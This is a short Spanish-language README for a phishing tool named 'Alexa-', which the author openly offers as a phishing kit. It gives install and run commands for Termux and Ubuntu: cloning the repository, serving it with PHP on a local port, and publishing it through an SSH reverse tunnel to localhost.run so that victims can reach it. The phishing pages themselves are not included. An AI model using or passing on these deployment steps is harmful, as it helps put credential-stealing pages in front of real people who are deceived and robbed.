# Alexa-
Hola les presento mi herramienta de phishing alexa 

Esta herramienta no tiene programación en bash shell 
Así que la ejecución es manual incita la independencia 

### Instalación en termux 
```
Clonar el repositorio 

git clone https://github.com/jayko1552/Alexa-

Instalación de php para abrir puerto

pkg install php

Ejecución de php para abrir un puerto

php -S 127.0.0.1:8080

En otra sesión instalar ssh para hacer tunnelling mediante
El servidor localhost.run más info en mi video en español
https://youtu.be/S0raxR7vTyk

Pkg install openssh

Ejecución de ssh para el tunnelling

ssh -R 80:localhost:8080 nokey@localhost.run
```
### Instalación en Ubuntu 
``` 
apt-get update && apt-get install php; apt-get install openssh 

git clone https://github.com/jayko1552/Alexa-

php -S 127.0.0.1:8080 

ssh -R 80:localhost:8080 nokey@localhost.run 

